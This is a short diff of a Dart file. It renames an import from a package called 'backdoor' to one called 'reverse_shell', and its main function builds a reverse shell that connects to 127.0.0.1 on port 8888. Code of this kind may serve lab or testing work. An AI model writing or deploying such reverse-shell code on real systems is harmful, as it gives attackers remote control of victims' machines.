@@ -1,4 +1,4 @@
-import 'package:backdoor/reverse_shell.dart';
+import 'package:reverse_shell/reverse_shell.dart';
 
 void main() {
   var shell = ReverseShell(host: '127.0.0.1', port: 8888);
